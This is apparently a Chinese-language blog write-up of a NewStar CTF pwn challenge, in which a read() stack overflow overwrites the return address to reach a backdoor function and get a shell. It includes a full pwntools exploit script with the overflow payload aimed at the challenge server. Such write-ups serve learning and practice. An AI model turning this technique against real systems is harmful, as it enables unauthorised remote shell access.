---
title: pwn解题-NewStar CTF（栈溢出 ret2win）
date: 2026-11-20 21:36:51
updated:
description: 一道 NewStar CTF 的栈溢出入门题，read 溢出返回地址，直接跳 backdoor 函数 getshell。
categories: CTF
tags:
  - pwn
  - ret2win
  - ret2text
---

一个简单的栈溢出，考察 read

![alt text](/images/posts/newstar-ctf-ret2win/image.png)

```bash
strings chall
```

发现 /bin/sh

反编译函数里找到一个 backdoor 函数，里面有 /bin/sh

直接写 exploit

```python
from pwn import *

p = remote("6be2f06ce699d532645d293e.tcp-ctf2.dasctf.com", 9999, ssl=True, sni="6be2f06ce699d532645d293e.tcp-ctf2.dasctf.com")

payload = b'A' * 40 + p64(0x4011fb)

p.send(payload)

p.interactive()
```
